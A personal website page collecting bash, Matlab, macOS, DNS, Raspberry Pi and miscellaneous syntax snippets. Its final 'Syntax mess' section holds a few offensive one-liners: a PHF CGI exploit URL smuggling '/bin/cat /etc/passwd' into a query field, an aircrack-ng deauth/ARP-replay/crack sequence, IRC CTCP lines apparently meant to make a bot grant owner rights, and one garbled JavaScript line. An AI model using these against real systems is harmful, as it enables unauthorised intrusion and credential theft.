---
layout: page
title: Hall Of Syntax
permalink: /syntax/
---

It's the place where I write down somewhat useful syntax snippets. Instead of keeping my local copy I decided to make it public. Maybe it's helpful for someone. Most probably that will be myself when I'm not near the local copy.

[1  Bash stuff](#Bash-stuff)<br>
  1.1  source and export<br>
  1.2  arguments<br>
  1.3  redirections and piping<br>
  1.4  conditional expressions<br>
  1.5  Loops<br>
  1.6  Using functions in bash<br>
  1.7  Some quite useful command syntax<br>
<br>
2  Miscellanous<br>
  2.1  Matlab: Manually plot connected dots<br>
  2.2  OS X: bash script toggling visibility of hidden files in Finder<br>
  2.3  OS X: bash script toggling the OS X dashboard<br>
  2.4  Editing DNS Records<br>
  2.5  Raspberry Pi Camera code snippets<br>
    2.5.1  take photos<br>
    2.5.2  rename photos<br>
    2.5.3  create video from photos<br>
<br>
3 [Syntax mess](#Syntax-mess)<br>



# Bash stuff

## source and export

Source and export are fundamental when you need to use other scripts or to be sure that child processes have see the variables they need:

    #!/bin/bash

    # source executes a script in the context of the calling shell
    source script.sh
    # source can be called by a single dot
    . script.sh
    # not to be confused with a dot at the beginning of a path which means "current directory"
    . ./dir1/script.sh
    # not to be confused with a dot at the beginning of a filename which indicates a hidden file
    . ./dir1/.script.sh

    # settings variables makes them available in the current process only
    FOO="HELLO WORLD"
    # any child process won't see $FOO

    # exported variables get passed on to child processes, non-exported variables do not
    export FOO="HELLO WORLD"
    # any child process now will see $FOO

    unset FOO

## arguments

The snippets below show how to use arguments inside a script:

    #!/bin/bash

    echo  "number of arguments     :"  $#
    echo  "programname             :"  $0
    echo  "1st argument            :"  $1
    echo  "2nd argument            :"  $2
    echo  "all arguments           :"  $*
    echo  "each argument in quotes :"  "$@"
    echo  "last return value       :"  $?

## redirections and piping

The snippets below show how to use redirections and piping:

    #!/bin/bash

    make 1> log.txt 2> error.txt    # redirect std output to log.txt and error to error.txt
    make > log.txt 2> error.txt     # same as above
    make >> log.txt 2>> error.txt   # same as above but appending instead overwriting
    make &> log.txt                 # redirect std output and error to log.txt
    make 2>&1 | tee log.txt         # redirect std error to standard output, then pipe to tee
    make 2>error.txt | hexdump -C   # pipe std output but redirect error to file
    hexdump -C < log.txt            # redirect std input

## conditional expressions

    #!/bin/bash

    # compile hello.c and run the program if compilation was successful
    gcc hello.c -o hello && ./hello
    # compile hello.c and print hello.c if compilation was not successful
    gcc hello.c -o hello || cat hello.c
    # combine both: run on success but print on failure
    gcc hello.c -o hello && ./hello || cat hello.c

    # execute 'ls' if argument 1 equals 1
    test $1 -eq 1 && ls

    # same as above
    [ $1 -eq 1 ] && ls

    # strings
    s1="abcdef"
    s2="xyz"
    if [ "$s1" =  "$s2" ];   then echo "strings are equal";     else echo "strings are not equal"; fi
    if [ "$s1" != "$s2" ];   then echo "strings are not equal"; else echo "strings are equal"; fi
    if [ "$s1" \<  "$s2" ];  then echo "s1 is smaller";         else echo "s1 is not smaller"; fi
    if [ "$s1" \>  "$s2" ];  then echo "s1 is bigger";          else echo "s1 is not bigger"; fi
    if [ -z "$s1" ]; then echo "string has zero length"; fi
    if [ -n "$s1" ]; then echo "string has not zero length"; fi

    # comparing numbers
    if [ x -eq y ]; then echo "equal"; fi
    if [ x -ne y ]; then echo "not equal"; fi
    if [ x -lt y ]; then echo "less than"; fi
    if [ x -gt y ]; then echo "greater than"; fi
    if [ x -le y ]; then echo "less or equal"; fi
    if [ x -ge y ]; then echo "greater or equal"; fi

    # expressions for testing
    if [ -d $1 ]; then echo "first argument is a directory"; fi
    if [ -f $1 ]; then echo "first argument is an ordinary file"; fi
    if [ -e $1 ]; then echo "first argument is an existing file"; fi
    if [ -r $1 ]; then echo "first argument is readable"; fi
    if [ -s $1 ]; then echo "first argument is a file with more than zero bytes"; fi
    if [ -w $1 ]; then echo "first argument is writable"; fi
    if [ -x $1 ]; then echo "first argument is executable"; fi
    if [ -n $1 ]; then echo "first argument (string) is larger than zero"; fi
    if [ -z $1 ]; then echo "first argument (string) has zero length"; fi
    if [ -o $1 ]; then echo "first argument (option) is active"; fi
    if [ file1 -nt file2 ]; then echo "file1 is newer than file2"; fi
    if [ file1 -ot file2 ]; then echo "file1 is older than file2"; fi

    # conjunction: -a
    if [ $x -eq 1 -a $y -lt 10 ]; then echo "true"; else echo "false"; fi

    # disjunction: -o
    if [ $x -eq 1 -o $y -lt 10 ]; then echo "true"; else echo "false"; fi

    # not: !
    if [ ! -f $1 ]; then echo "true"; else echo "false"; fi

    # using grep for conditional expressions
    if grep -q keyword $file
    then
      echo "keyword found"
    else
      echo "keyword not found"
    fi

    # check second argument for value 's', 'c' or 'h'
    case $2 in
    s) echo "SHOW IT"
       cat $1;;
    c) echo "COMPILE IT"
       gcc $1;;
    h) echo "HEXDUMP IT"
       hexdump -C $1;;
    *) echo "DO NOTHING";;
    esac

## Loops

    #!/bin/bash

    # for loop that lists all arguments line by line
    for i in $*; do
      echo $i
    done

    # shortcut for the loop above
    for i; do
      echo $i
    done

    # list all arguments with index like "argument 3: ..."
    j=1
    for i in $*; do
      echo "argument $j:" $i
      ((j++))
    done

    # same behaviour as the loop above
    for (( i=1; i<$#+1; i++ ))
    do
      echo "argument" $i":" ${!i}
    done

    # example: ping hosts that are listed in server.txt (separated by space or line break)
    for i in `cat server.txt`
    do
      echo -e -n $i "\t-> "
      ping -c 1 $i | grep "ttl=" 
    done

    # alternative for above using while and read
    while read f
    do
      echo -e -n $f "\t-> "
      ping -c 1 $f | grep "ttl="
    done < server.txt

    while read f
    do
    done < server.txt

    # while loop: loop while val is not 1 and not 2
    val=0
    while test $val != 1 && test $val != 2
    do
      echo -n "enter val (must be 1 or 2) > "
      read val
    done

    # until loop: loop until val is 3
    val=0
    until test $val = 3
    do
      echo -n "enter val (must be 3) > "
      read val
    done


## Using functions in bash:

    #!/bin/bash

    # foo prints the sum of its numerical arguments
    foo()
    {
      sum=0
      for i; do sum=$[ sum + $i ]; done
      echo "The sum of $* is" $sum
    }

    bar()
    {
      echo "This is bar. I don't use arguments."
    }

    foo 100 5 200
    bar 100 5 200

## Some quite useful command syntax

    # show third field of each line in test.txt with delimiter '#'
    cut -d# -f3 test.txt

    # print the second word of each line in test.txt
    awk '{ print $2 }' test.txt

    # calculate something near to PI
    echo "scale=5; 22/7" | bc

    # replace string "auss" with "inn"
    sed s/auss/inn/g test.txt
    # same as above plus overwrite file with result and store backup with extension ".backup"
    sed -i .backup s/auss/inn/g test.txt



# Miscellanous

## Matlab: Manually plot connected dots

This Matlab script draws and connects single points which are given by the array with the variable name points. The image to the right shows the result of the script below. The script checks the size of the array points with the size() function and assigns the returned value – which is (8, 2) in the example below – to the variable x. That means we have an array with 8 times 2 values. Later, x is used by the for-loop to get the amount of points with x(1) which returns 8. Before doing the actual task, a horizontal and a vertical black line is plotted to indicate the abscissa and the ordinate. Then the script draws a filled circle for each point and then plots a line to the next point.
draw connected points with Matlab

    hold off

    % set points to draw and connect
    points = [ 0 0;  5 5;  10 5;  11 10; 15 5; 15 15; 5 15; 0 0];

    % get amount of points in array points
    x = size(points);
    amount = x(1);

    % plot the axes to the plot explicitly
    plot([0 0], [-5 20], 'k-')
    hold on
    grid on
    plot([-5 20], [0 0], 'k-')

    % draw each point and a line to the next point
    for i = 0:x(1)-1
        scatter(points(i+1,1),points(i+1,2),50,'blue','filled')
        plot([points(i+1,1) points(i+2,1)], [points(i+1,2) points(i+2,2)], 'blue-')
    end
    scatter(points(i+1,1),points(i+1,2),50,'blue','filled')

    hold off

## OS X: bash script toggling visibility of hidden files in Finder

toggle hidden files visibility in OS X Finder

    if [ "$1" == "ON" ];then
    echo "Setting Finder to show hidden files"
    defaults write com.apple.finder AppleShowAllFiles TRUE;killall Finder
    else
        if [ "$1" == "OFF" ];then
        echo "Setting Finder to NOT show hidden files"
        defaults write com.apple.finder AppleShowAllFiles FALSE;killall Finder
        else
            echo "Give me parameter ON or OFF"
        fi
    fi

## OS X: bash script toggling the OS X dashboard

kill or enable the OS X dashboard

    if [ "$1" == "ON" ];then
    echo "Enabling dashboard..."
    defaults write com.apple.dashboard mcx-disabled -boolean NO && killall Dock
    else
        if [ "$1" == "OFF" ];then
        echo "Killing dashboard..."
        defaults write com.apple.dashboard mcx-disabled -boolean YES && killall Dock
        else
            echo "Give me parameter ON or OFF"
        fi
    fi


## Editing DNS Records

    General Syntax: [DOMAIN/SUBDOMAIN] [TYPE] [VALUE]

    TYPE        DESCRIPTION
    --------------------------
    A           point to IPv4
    AAAA        point to IPv6
    CNAME       redirect to another domain or subdomain

    examples:
    website.com       A       1.2.3.4
    www.website.com   CNAME   website.com
    blog.website.com  CNAME   website.com
    ftp.website.com   CNAME   website.com
    *.website.com     CNAME   website.com
    pi.snej.de        CNAME   snej.mygreatdnsservice.com

## Raspberry Pi Camera code snippets

### take photos

    while [ 1 ]
    do
        uname -a > cam.txt
        echo -n `date` "uptime=" >> cam.txt
        echo `uptime` | cut -b13- >> cam.txt
        echo -n "soc_core_" >> cam.txt
        /opt/vc/bin/vcgencmd measure_temp >> cam.txt
        raspistill -t 0 -n -q 20 -ex night -rot 270 -w 1024 -h 768 -o cam_new.jpg
        convert -pointsize 20 -fill yellow -draw 'text 10,20 "@cam.txt"' cam_new.jpg cam_new.jpg
        mv cam_new.jpg cam.jpg
        convert cam.jpg -resize 50% -quality 50 "snapshots/cam_`date +%Y-%m-%d_%H-%M-%S`.jpg"
        sleep 6
    done

### rename photos
    for file in *.JPG ; do mv "${file}" "${file%.JPG}_suffix.JPG";  done
    i=1;
    for file in cam_*.JPG ; do mv -v "${file}" "$i.jpeg"; i=$[i+1]; done

### create video from photos
    ~/bin/ffmpeg -r 20 -i %d.jpeg /Users/jens/Desktop/vid.mp4


# Syntax mess

Here you'll see a mess of syntax snippets that I found useful at some point in my life. Since this category is called 'mess' there is no particular order or useful description. Continue reading at your own risk!

    setterm -blength 0
    xset b off

    ##
    ## public DNS servers
    ##
    Provider                Primary DNS Server  Secondary DNS Server
    Level31                 209.244.0.3         209.244.0.4
    Google2                 8.8.8.8             8.8.4.4
    Comodo Secure DNS       8.26.56.26          8.20.247.20
    OpenDNS Home3           208.67.222.222      208.67.220.220
    DNS Advantage           156.154.70.1        156.154.71.1
    Norton ConnectSafe4     199.85.126.10       199.85.127.10
    GreenTeamDNS5           81.218.119.11       209.88.198.133
    SafeDNS6                195.46.39.39        195.46.39.40
    OpenNIC7                216.87.84.211       23.90.4.6
    Public-Root8            199.5.157.131       208.71.35.137
    SmartViper              208.76.50.50        208.76.51.51
    Dyn                     216.146.35.35       216.146.36.36
    censurfridns.dk9        89.233.43.71        89.104.194.142
    Hurricane Electric10    74.82.42.42  
    puntCAT11               109.69.8.51  

    # 99 bottles of lisp
    (labels ((foo (x)
       (and (<= 0 x) (cons x (foo (1- x))))))
       (format t (format nil 
            "~~{~~&~~@(~~%~~R ~A ~A!~~)~~:*~~&~~@(~~R
    ~0@*~A!~~)~~&~~@(~2@*~A!~~)~~&~~@(~~[~A~~:;~~:*~~R~~:*~~] ~0@*~A!~~)~~}"
            "bottles of beer"
            "on the wall"
            "take one down, pass it around" 
            "no more"
            )
     (foo 99)))

    # HTTP GET REQUEST
    GET / HTTP/1.1
    Host: snej.de

    # Avoid iTunes device backups
    defaults write com.apple.iTunes AutomaticDeviceBackupsDisabled -bool true

    for i in `ls *.jpg`; do convert -resize 50% -quality 90 $i conv_$i; done 

    # crop all files and then... do some more things
    for i in `ls *.png`; do convert -verbose -crop 1352x970+985+219 $i 123/conv_$i; done
    i=0; while [ $i -lt 10 ]; do echo "mv seite_$i"; i=$[i+1]; done
    for name in *\ *; do echo \"$name\"; done

    # old perma links
    http://www.snej.de/2014/06/top-5-swift-features-briefly-explained.html
    http://www.snej.de/2014/06/swift-announced.html
    http://www.snej.de/2014/04/onelinesystemmon-simple-geeklet-that.html
    http://www.snej.de/2013/07/raspberry-pi-setting-up-wifi-connection.html
    http://www.snej.de/2012/11/jingle-bells-playing-light-up-piano.html
    http://www.snej.de/2011/08/think-win-win.html
    http://www.snej.de/2010/08/spartanpong.html
    http://www.snej.de/p/contact_24.html

    # /usr/local/sbin/wpa_supplicant -B -w -i ath0 -D madwifi \
    -c /etc/wpa_supplicant.conf -dd
    State: GROUP_HANDSHAKE -> COMPLETED

    # file permissions
    r            read.
    w            write.
    x            execute or access for directories.
    X            execute only if the file is a directory or already has
                 execute permission  for  some user.
    s            set user or group ID on execution.
    t            sticky.
    u            the permissions granted to the user who owns the file.
    g            the permissions granted to the file’s group.
    o            and the permissions granted to users that are not u or g.

    # ameib port
    port 14191

    # Xilinx ISE/EDK under linux
    alias xilinx=’source $HOME/opt/XilinxDesignSuite_101_64/ISE/settings64.sh; source \
    $HOME/opt/XilinxDesignSuite_101_64/EDK/settings64.sh; export \
    LD_PRELOAD=$HOME/opt/usb-driver/libusb-driver.so; echo $1; \
    LD_LIBRARY_PATH=”“; LD_PRELOAD_PATH=”“’

    classical:
        cp /boot/config-XXX .config
        make menuconfig
        make dep
        make bzImage
        make modules
        make modules_install
        (evtl /etc/modules editieren)

    debian:
        cp /boot/config-XXX .config
        make menuconfig
        make-kpkg clean
        fakeroot make-kpkg –initrd –revision=custom.1.0 –append-to-version==custom.1.0 kernel_image
        dpkg -i XXX.deb

    ++++++ COMPILING THE KERNEL ++++++
    1 make menuconfig
    2 make-kpkg clean
    3 fakeroot make-kpkg –revision=custom.1.0 kernel_image
    4 if (error) make clean; GOTO 2
    5 dpkg -i kernel-image-2.6.8.1_custom.1.0_i386.deb
    6 cd /boot/; mkinitrd -o /boot/initrd.img-2.6.8.1 2.6.8.1

    vmlinuz initrd=initrd.img
    linux initrd=initrd.img
    /boot/isolinux/linux initrd=/boot/isolinux/initramfs_data_cpio.gz video=vesafb:1024x768-16@75

    kernel-quellen an die config des laufenden kernels anpassen (suse?):
        make mrproper
        make cloneconfig
        make dep
        (make prepare)?


    shopt -s dotglob
    cmap w!! %!sudo tee > /dev/null %
    diff -arq 

    grep -A 0 -B 0 -Irin –include=*.[ch] “this_is_a_pattern” .

    find . -iname “*.c” -exec cp -nv “{}” /home/foo/bar/ \;


    ” VIM Switch off all auto-indenting
    set nocindent
    set nosmartindent
    set noautoindent
    set indentexpr=
    filetype indent off
    filetype plugin indent off

    # terminal settings
    set term=cons25

    sudo mount -t ntfs -o rw,auto,nobrowse /dev/disk1s1 /Users/jens/mnt_sticky
    #update-rc.d -f gdm remove
    #update-rc.d -f gdm defaults

    pdftk secured.pdf input_pw foopass output unsecured.pd

    rsync -qaHExA

    find / -mtime -1 \! -type d -print > /tmp/filelist.daily

    mount -o conv=auto


    semilogx(x, 20*log(y),’b.-‘);
    title(‘Frequenzgang Versuch 4.2’);
    xlabel(‘Frequenz / Hz’);
    ylabel(‘Verstärkung / dB’);
    grid;
    axis([0 1590 0 60])
    grep Verkauft vk.txt -A1 | grep EUR | cut -c 5-

    sudo tmutil disablelocal
    sudo tmutil enablelocal

    openssl aes-256-cbc -e -a -in PLAIN -out ENCRYPTED
    openssl aes-256-cbc -d -a -in ENCRYPTED -out PLAIN

    git tag -a v1.0
    git tag -a v0.9 558151a
    git log –oneline –decorate –graph

    $ cat /etc/udev/usbprog.rules
    ATTRS{idVendor}==”03eb”, ATTRS{idProduct}==”2104”, MODE=”0660”,
    GROUP=”plugdev”
    $ ls -l /etc/udev/rules.d/z90_usbprog.rules
    lrwxrwxrwx 1 root root 16 2008-05-19 17:51
    /etc/udev/rules.d/z90_usbprog.rules -> ../usbprog.rules

    iwlist
    iwpriv ath0 mode X  # 0=abg, 1=a, 2=b, 3=g 
                turbo X # 0, 1
    modprobe ath_pci countrycode=276    # de

    .htaccess
        Options +Indexes

    # apt-get update

    winres.h
    #pragma comment(lib, “ode.lib”)

    #define STRING_SELF_INIT(a) char string_##a = #a
    STRING_SELF_INIT(xyz); // char string_xyz = “xyz”

    sfdisk -l -uS imagefile

    mount -oloop,offset=4711 imagefile /mnt/point

    nolmhash

    bind ctcr - PING ctcr:pingreply
    proc ctcr:pingreply {nick uhost hand dest key arg} {
    set dur [expr [unixtime] - $arg]
    putserv "NOTICE $nick :Your ping reply took $dur seconds" }
    /ctcpreply  PING [ adduser  *!@ * ]
    /ctcpreply  PING [ chattr  +nm ]
    /msg  pass 
    /dcc chat 

    http://www.try2hack.nl/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd




    ARP REPLAY: aireplay -3 -b  -h  (-x ) ath0
    DEAUTH:   aireplay -0 1 -a  -c  ath0

    -ng commands:
    sniff:
        airodump-ng ath0
    sniff on channel 11 and dump:
        airodump-ng -c 11 -w dump ath0
    test if injection works:
        aireplay-ng –fakeauth 0 -e ESSID -a BSSID -h YOUR_MAC ath0
    start arp replay:
        aireplay-ng –arpreplay -b BSSID -h CONNECTED_CLIENT ath0
    force clients to reconnect:
        aireplay-ng –deauth 5 -a BSSID -c CONNECTED_CLIENT ath0
    crack:
        aircrack-ng -b BSSID dump-01.cap


    GetProcAddress(LoadLibrary(“powrprof.dll”), “SetSuspendState”)(TRUE,TRUE,TRUE);


    javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24;x4=300; y4=200; x5=300; y5=200; DI=document.images; DIL=DI.length;function A(){for(i=0; i~/dumps/`date +%Y%m%d%H%M%S`.jpg


    dd if=filename of=/dev/fd0 bs=1024 conv=sync ; sync


    tftp
     binary
     trace
    put openwrt-brcm-2.4-squashfs.trx
    openwrt-wrt54g-squashfs.bin


    NoDriveTypeAutoRun -> ff


    find verzeichnis -type d -print | xargs chmod 755
    find verzeichnis -type f -print | xargs chmod 644


    head -vc 9999m *|hexdump -C|grep -e “jens” -e “JENS” -e “Jens”



    source=prism54g,eth2,wlan
    source=madwifi_ab,wifi0,wlan


    svga.maxHeight=1920
    svga.maxWidth=1400 


    /usr/lib/hotplug/firmware


    irc.rz.uni-karlsruhe.de


    VGA Modes:
    COLORS(BITS)    640 800 1024    1280    1600
     8      769 771 773 775 796
    15      784 787 790 793 797
    16      785 788 791 794 798
    24      786 789 792 795 799


    telnet whois.arin.net 43

    /etc/php5/pool.d/fpm/www.conf

    #
    # IPTABLES DEFIRE
    #

    #!/bin/sh
    IPTABLES=/sbin/iptables
    #Loeschen bestehender Regeln und Chains
    $IPTABLES -t filter -F
    $IPTABLES -t mangle -F
    $IPTABLES -t nat -F
    $IPTABLES -X
    #Allgemeine Policy
    $IPTABLES -P INPUT ACCEPT
    $IPTABLES -P OUTPUT ACCEPT
    $IPTABLES -P FORWARD ACCEPT

    #
    # IP TABLES - FIRE
    #
    #!/bin/sh
    IPTABLES=/sbin/iptables
    #Loeschen bestehender Regeln und Chains
    $IPTABLES -t filter -F
    $IPTABLES -t mangle -F
    $IPTABLES -t nat -F
    $IPTABLES -X
    #Allgemeine Policy
    $IPTABLES -P INPUT DROP
    $IPTABLES -P OUTPUT DROP
    $IPTABLES -P FORWARD DROP
    #Freigabe Loopbackdevice
    $IPTABLES -A INPUT -i lo -j ACCEPT
    $IPTABLES -A OUTPUT -o lo -j ACCEPT
    #SSH zulassen von INTIP
    #$IPTABLES -A INPUT -i $INSIDE -p tcp -s $INTIP –sport 1024: -d $INTIP –dport 22 -j ACCEPT
    #$IPTABLES -A OUTPUT -o $INSIDE -p tcp -s $INTIP –sport 22 -d $INTIP –dport 1024: -j ACCEPT
    # WWW 
    $IPTABLES -A OUTPUT -p tcp –sport 1024: –dport 80    -m state –state NEW,ESTABLISHED -j ACCEPT
    $IPTABLES -A INPUT  -p tcp –sport 80    –dport 1024: -m state –state ESTABLISHED     -j ACCEPT
    # DNS
    $IPTABLES -A OUTPUT -p udp –sport 1024: –dport 53    -j ACCEPT
    $IPTABLES -A INPUT  -p udp –sport 53    –dport 1024: -j ACCEPT
    #SMTP,POP3 auf von INT_IP auf lanserver zulassen
    #$IPTABLES -A FORWARD -p tcp -s $INTIP –sport 1024: –dport 110 -d $LANSERVER -o $OUTSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s $LANSERVER -d $INTIP –sport 110 –dport 1024: -o $INSIDE -m state –state ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s $INTIP –sport 1024: –dport 25 -d $LANSERVER -o $OUTSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s $LANSERVER -d $INTIP –sport 25 –dport 1024: -o $INSIDE -m state –state ESTABLISHED -j ACCEPT
    #
    #ICMP mit 10pak/min nur zu LANSERVER
    #$IPTABLES -A FORWARD -p icmp -m limit –limit 10/m -s $INTIP -d $LANSERVER -o $OUTSIDE -j ACCEPT
    #$IPTABLES -A FORWARD -p icmp -m limit –limit 10/m -d $INTIP -s $LANSERVER -o $INSIDE -j ACCEPT
    #
    #WWW zulassen von EXTIP auf int WWW-Srv
    #$IPTABLES -A FORWARD -p tcp -s $EXTIP –sport 1024: –dport 80 -o $INSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s $INTWEB –sport 80 –dport 1024: -o $OUTSIDE -m state –state ESTABLISHED -j ACCEPT
    #
    #SSH,FTP auf testserver von int WorkStation
    #$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 –sport 1024: –dport 22 -o $OUTSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 –sport 22 –dport 1024: -o $INSIDE -m state –state ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 –sport 1024: –dport 21 -o $OUTSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s 172.17.1.3 -d 172.16.1.7 –sport 1024: –dport 20 -o $OUTSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 –sport 21 –dport 1024: -o $INSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #$IPTABLES -A FORWARD -p tcp -s 172.16.1.7 -d 172.17.1.3 –sport 20 –dport 1024: -o $INSIDE -m state –state NEW,ESTABLISHED -j ACCEPT
    #
    #NAT
    #$IPTABLES -t nat -A PREROUTING -d $EXTIP -i $OUTSIDE -j DNAT –to-destination 172.17.1.2

    export PATH=$PATH:$HOME/bin

    alias english=’export LANG=en_US’


    #!/bin/bash
    #
    i=$1
    end=$2
    sum=0
    count=0
    average=0
    #
    # checking parameters for validity
    if [ $1 -ge 0 -a $2 -ge $1 ]
    then
    #
    # main prog
    while [ $i -lt $[end+1] ]
      do
        if [ -f $i.jpg ]
          then
            sum=$[sum+i]
            count=$[count+1]
            echo -n “*”
          else
            # wget -q $BASE_URL/$i.jpg
              pavuk -bg -base_level 4 -quiet -http_proxy $PROXY -nocache $BASE_URL/$i.jpg
              sleep $3
            if [ -f $i.jpg ]
              then
                sum=$[sum+i]
                count=$[count+1]
                echo -n [$i]
              else
                echo -n ” ”
           fi
        fi
        i=$[i+1]
    done
    echo “”
    if [ $sum -gt 0 ]
      then
        echo “$sum / $count = $[sum/count]”
      else
        echo “nothing found”
    fi
    # short help
    else
    echo “Usage : getpics START END DELAY”
    fi

